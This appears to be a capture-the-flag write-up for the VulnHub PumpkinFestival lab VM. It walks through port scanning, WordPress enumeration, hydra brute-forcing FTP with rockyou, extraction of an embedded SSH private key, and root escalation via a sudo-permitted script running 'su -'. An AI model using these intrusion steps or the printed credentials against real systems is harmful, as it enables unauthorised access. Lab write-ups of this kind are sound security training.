# Mission-Pumpkin v1.0: PumpkinFestival

This writeup is about the third and final part of the Pumpkin series from [VulnHub](https://www.vulnhub.com/?q=pumpkin).

## Techniques used
````
- nmap
- ftp
- dirb
- wpscan
- hydra
- binwalk
- tar
- bunzip2
- SSH
````

*[Image: Image]*

## Finding out the IP address

In the third part, the IP is also displayed when the VM is started.

Now my target is 192.168.178.61!

## Portscan

Also this time I start with a port scan: but now with nmap! :)

`nmap -A 192.168.178.61` tells me that there are two open ports.
````
PORT      STATE    SERVICE      VERSION
21/tcp    open     ftp          vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jul 12  2019 secret
80/tcp    open     http         Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: WordPress 4.9.3
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Pumpkin Festival &#8211; PumpkinToken : 06c3eb12ef2389e2752335...
````

That starts off well, an FTP server with a directory called "secret" and a web server with some sort of token and a hash.

## FTP-Server

This time I started with the ftp-server. Let's see what's in the "secret" directory.

Here I navigated to the first token with the commands `cd secret`,` ls` and `get token.txt`.

*[Image: Image]*

`PumpkinToken : 2d6dbbae84d724409606eddd9dd71265 `

## Webserver

So now it's time for the web server:

*[Image: Image]*

Thank you for growing pumpkins, Jack. Help from Harry? Who is Harry now?

Okay, PumpkinTokens obviously help me get in. This will be interesting.

Alohomora ... I've heard that before, but I don't know exactly where.

A quick look at Google tells me that I must have read it in a Harry Potter book years ago.

It's a spell that is supposed to open doors. Could be a password.

So it's clear which Harry helped here :)

When I wanted to look at the source, I noticed that the right-click was blocked here.

Okay, then just put a `view-source:` in front of the actual address and it works anyway.

The source code contains the request to Harry to find the pumpkins.

Tricky! The second token is written on the site in the background color.

*[Image: Image]*

`PumpkinToken : 45d9ee7239bc6b0bb21d3f8e1c5faa52`

## dirb

Let's see if there is anything else interesting to discover on the web server.

`dirb http://192.168.178.61`

There are a few objects that I would like to take a closer look at.

````
+ http://192.168.178.61/robots.txt (CODE:200|SIZE:102)
==> DIRECTORY: http://192.168.178.61/store/
==> DIRECTORY: http://192.168.178.61/users/
````

First I take a look at the robots.txt:
````
User-agent: * 
Disallow: /wordpress/
Disallow: /tokens/
Disallow: /users/
Disallow: /store/track.txt
````
/wordpress/ results in a 404 error.

/tokens/ results at least in a 403: Forbidden Error.

/users/ too.

I can look at /store/track.txt:

````
Hey Jack!

Thanks for choosing our local store. Hope you like the services.
Tracking code : 2542 8231 6783 486

-Regards 
admin@pumpkins.local
````

What exactly I can do with the tracking code is not yet clear to me.

But first make a note of this, who knows what it can be good for.

Anyway, the sender tells me to put pumpkins.local in my `/etc/hosts` file.

This may also be a new username.

`nano /etc/hosts` and enter the following under the loopback address (127.0.0.1):

`192.168.178.61 pumpkins.local`

I then entered pumpkins.local in the browser:

*[Image: Image]*

At the bottom of the page is the third token:

`PumpkinToken : 06c3eb12ef2389e2752335beccfb2080`

Scrolling a little deeper you will find the note which determines the next step:

## Proudly powered by WordPress

Accordingly, I run wpscan next:

`wpscan -e u --url http://pumpkins.local`

Here, interesting facts are brought to light, too:

````
[+] WordPress readme found: http://pumpkins.local/readme.html
[+] Upload directory has listing enabled: http://pumpkins.local/wp-content/uploads/
[i] User(s) Identified:
[+] admin
[+] morse
````

Okay, let's start from top to bottom: Wordpress Readme:

*[Image: Image]*

That's interesting :)

K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s is neither base64, base32 nor one of the hashes that `hash identifier` knows.

That makes me curious. I can hardly imagine that gibberish was simply written on the page.

At [Cyber-Chef](https://gchq.github.io/CyberChef/) you can test various types of encryption.

After what felt like an eternity of manual tests, I finally found what I was looking for -> base62 :)

`K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s:morse & jack : Ug0t!TrIpyJ`

Looks like I found two pairs of login details there.

Now I'm going to take a look at the rest of the Wordpress pages before looking for a way to use the login data.

#6(no title) gives a nice hint:

*[Image: Image]*

So I need all PumpkinTokens to be able to generate the ticket.

It would be good to know now how many "all" are ...

The remaining pages were all uninteresting templates. You can log in via the blog site.

morse : Ug0t!TrIpyJ works!

Unfortunately morse is not an admin, but as we learned in the last part of the series, he is only the supplier for pumpkin seeds.

When I had looked through almost all of the pages, my eyes fell on the profile.

The fourth token is hidden under `Biographical Info`:

*[Image: Image]*

`PumpkinToken : 7139e925fd43618653e51f820bc6201b`

I haven't found anything else here, so -> Log out!

Jack : Ug0t!TrIpyJ does not work! Then I have to try the admin.

But unfortunately I don't have a password for admin ...

After a while and many unsuccessful attempts, I reread my notes and concluded that "Alohomora!" now would be the right spell for my situation.

In fact it works!

admin : Alohomora! really opens a door for me here.

Let's see what can be found now.

In any case, there is a draft for a posting that I had already recognized with morse, but which I couldn't look at.

There is not much in it. But it doesn't have to, the content is enough for me:

*[Image: Image]*

`PumpkinToken : f2e00edc353309b40e1aed18e18ab2c4`

Token Number 5!

But nothing more was to be found here. Somehow I got stuck.

## If there is no progress, you may have missed something ...

To avoid this error, I started nmap again and this time checked all ports.
At the same time, dirbuster ran with an extremely large wordlist and recursive search.
And so that I don't miss anything, I let go of hydra on the FTP server to search for access for users jack, morse and harry:

`nmap -sC -sV -A -p- 192.168.178.61`

Dirbuster ran as a GUI because dirb has problems with such large wordlists.

`hydra -e nsr -L users.txt -P /root/Wordlists/rockyou.txt`

Definitely time to take a short (to medium) coffee break.

Back on the computer, I was presented with results that I had not expected:

Dirbuster found another file in the /tokens/ directory on the server http://192.168.178.61:

*[Image: Image]*

`PumpkinToken : 2c0e11d2200e2604587c331f02a7ebea`

Token Number 6!

hydra actually gave me new creds for the FTP server.

*[Image: Image]*

`harry:yrrah` 

## FTP second try

Logged in with the new creds, the next token is right in front of my nose.

`get token.txt` and` cat token.txt` show me the content of token number 7:

`PumpkinToken : ba9fa9abf2be9373b7cbd9a6457f374e`

After I opened the folders `Donotopen`,` NO`, `NOO`,` NOOO` and `NOOOO`, the next token was there:

*[Image: Image]*

`PumpkinToken : f9c5053d01e0dfc30066476ab0f0564c`

Now there are already 8 tokens.

Well, someone probably enjoyed creating a "No" folder structure. So dig deeper:

`cd NOOOOO`, `cd NOOOOOO` & `get data.txt`

`cat data.txt` shows a lot of clutter. So it is not a "real" text file.

With binwalk you can find out what is really hidden inside the file:

````
binwalk data.txt
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             POSIX tar archive
````

I unpack the archive with `tar -xf data.txt`.

I examine the resulting file `data` again with binwalk, since it is also not readable for `cat`:

````
binwalk data
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             bzip2 compressed data, block size = 900k
````

Anyone who creates such folder structures as on the FTP server also packs archives into archives :)

````
bunzip2 data
bunzip2: Can't guess original name for data -- using data.out

binwalk data.out 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             POSIX tar archive

tar -xf data.out
tar: Ein einzelner Nullblock bei 25

binwalk key 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             POSIX tar archive

tar -xf key
tar: Ein einzelner Nullblock bei 22
````
The resulting file "jack" is again a text file. However, one that is written in hex format.

When I pipe this file to hex2raw, I feel like it is not complete.

So I entered it again into an [Online Hex-Decoder](https://cryptii.com/pipes/hex-decoder) and it now seems to be complete:

````
-----BEGIN OPENSSH PRIVATE KEY-----
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
16k4l9SUtcrJAAAACXJvb3RAa2FsaQE=
-----END OPENSSH PRIVATE KEY-----
````

An SSH private key. The file name suggests that it's user is "jack".

## SSH

nmap had provided me with the appropriate port for SSH in the meantime:

`6880/tcp open   ssh                OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)`

So I'll try a connection with the key and User Jack:

*[Image: Image]*

Okay, a "private key" that everyone can read is really not that private.
I didn't know that because of this you couldn't connect to it via SSH. Learned something again.

`chmod 600 jack.txt` should solve the problem.

Bingo!

````
ssh -l jack -i jack.txt -p 6880 192.168.178.61
------------------------------------------------------------------------------
                          Welcome to Mission-Pumpkin
      All remote connections to this machine are monitored and recorded
------------------------------------------------------------------------------

Last login: Tue Jun 18 21:04:28 2019 from 192.168.1.105
-bash: /home/jack/.bash_profile: Permission denied
jack@pumpkin:~$ ls -la
total 48
drwx------ 5 jack jack  4096 Sep 18 22:19 .
drwxr-xr-x 5 root root  4096 Jul 12  2019 ..
-rw------- 1 root root     0 Sep 18 22:19 .bash_history
-rw-r--r-- 1 jack jack   231 Jul 15  2019 .bash_logout
-rw------- 1 root root    94 Jul 16  2019 .bash_profile
-rw-r--r-- 1 jack jack  3675 Jul 15  2019 .bashrc
drwx------ 2 jack jack  4096 Jul 12  2019 .cache
-rw-r--r-- 1 jack jack   675 Jul 12  2019 .profile
drwxrwxr-x 2 jack jack  4096 Jul 12  2019 .ssh
-rwsr-xr-x 1 root root 11232 Jul 15  2019 token
````
The file `token` cannot be read. With `file token` I can see what kind of file it is.

So it's an executable file. With `./token` I execute it and get token number 9 displayed:

````
token: setuid ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=977c5f4023cb5e77599fd8194089aa03f155ad88, stripped
jack@pumpkin:~$ ./token 
 
PumpkinToken : 8d66ef0055b43d80c34917ec6c75f706
````

At this point I looked around a little and try to discover what information I can get out of the box.

````
jack@pumpkin:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
goblin:x:1001:1001:Goblin,,,:/home/goblin:/bin/bash
harry:x:1002:1002:Harry,,,:/home/harry:/bin/bash

jack@pumpkin:~$ ls -la ..
total 20
drwxr-xr-x  5 root     root     4096 Jul 12  2019 .
drwxr-xr-x 22 root     root     4096 Jul 12  2019 ..
drwx------  3 harry    harry    4096 Jul 15  2019 harry
drwx------  4 jack     jack     4096 Sep 22 12:16 jack
drwxr-xr-x  5 www-data www-data 4096 Jul 12  2019 web
jack@pumpkin:~$ ls -la ../web/
total 200
drwxr-xr-x  5 www-data www-data  4096 Jul 12  2019 .
drwxr-xr-x  5 root     root      4096 Jul 12  2019 ..
-rw-r--r--  1 www-data www-data    35 Jul 12  2019 .htaccess
-rw-r--r--  1 nobody   nogroup    418 Sep 25  2013 index.php
-rw-r--r--  1 nobody   nogroup  19988 Jul 13  2019 license.txt
-rw-r--r--  1 nobody   nogroup    642 Jul 16  2019 readme.html
-rw-r--r--  1 nobody   nogroup   5434 Sep 23  2017 wp-activate.php
drwxr-xr-x  9 nobody   nogroup   4096 Feb  6  2018 wp-admin
-rw-r--r--  1 nobody   nogroup    364 Dec 19  2015 wp-blog-header.php
-rw-r--r--  1 nobody   nogroup   1627 Aug 29  2016 wp-comments-post.php
-rw-rw-rw-  1 www-data www-data  3124 Jul 14  2019 wp-config.php
-rw-r--r--  1 nobody   nogroup   2853 Dec 16  2015 wp-config-sample.php
drwxrwxrwx  5 nobody   nogroup   4096 Sep 22 02:52 wp-content
-rw-r--r--  1 nobody   nogroup   3669 Aug 20  2017 wp-cron.php
drwxr-xr-x 18 nobody   nogroup  12288 Feb  6  2018 wp-includes
-rw-r--r--  1 nobody   nogroup   2422 Nov 21  2016 wp-links-opml.php
-rw-r--r--  1 nobody   nogroup   3306 Aug 22  2017 wp-load.php
-rw-r--r--  1 nobody   nogroup  36583 Oct 13  2017 wp-login.php
-rw-r--r--  1 nobody   nogroup   8048 Jan 11  2017 wp-mail.php
-rw-r--r--  1 nobody   nogroup  16246 Oct  4  2017 wp-settings.php
-rw-r--r--  1 nobody   nogroup  30071 Oct 18  2017 wp-signup.php
-rw-r--r--  1 nobody   nogroup   4620 Oct 24  2017 wp-trackback.php
-rw-r--r--  1 nobody   nogroup   3065 Aug 31  2016 xmlrpc.php

jack@pumpkin:~$ cat ../web/license.txt 
WordPress - Web publishing software

Copyright 2011-2018 by the contributors

PumpkinToken : 5ff346114d634a015ce413e1bc3d8d71

This program is free software; you can redistribute it and/or modify
[...]
````

Not bad, that was a very well hidden token number 10!

Since I got Jack's password from the page http://pumpkins.local/readme.html, I tried `sudo -l`. Maybe he can do something as root.

*[Image: Image]*

Neither the directory nor the file existed at this point in time, so I have a free hand what I create there.

Due to the advanced time and the smell of a root shell in the air, I was quite uncreative here:

````
jack@pumpkin:~$ mkdir pumpkins
jack@pumpkin:~$ cd pumpkins/
jack@pumpkin:~/pumpkins$ nano alohomora
jack@pumpkin:~/pumpkins$ cat alohomora 
#!/bin/sh
echo "Alohomora!"
su -
jack@pumpkin:~/pumpkins$ chmod +x alohomora
jack@pumpkin:~/pumpkins$ sudo ./alohomora 
Alohomora!
root@pumpkin:~# 
````

## Root-Shell :)

Securing the ticket was a pice of cake now.

I find it interesting that in the end I didn't need one of the tokens. But very satisfying that I found them all!

````
root@pumpkin:~# cd /root/
root@pumpkin:~# ls -la
total 36
drwx------  3 root root 4096 Jul 16  2019 .
drwxr-xr-x 22 root root 4096 Jul 12  2019 ..
-rw-r--r--  1 root root   55 Jul 15  2019 .bash_logout
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
drwx------  2 root root 4096 Jul 12  2019 .cache
-rw-------  1 root root  369 Jul 13  2019 .mysql_history
-rw-------  1 root root   89 Jul 16  2019 .nano_history
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root 1688 Jul 15  2019 PumpkinFestival_Ticket
````
*[Image: Image]*

I really liked the series and it was tricky in some places!
Can be recommended without restriction! :)

Thanks for reading and happy pwning!

Contact -> [Twitter](https://twitter.com/_the_someone)
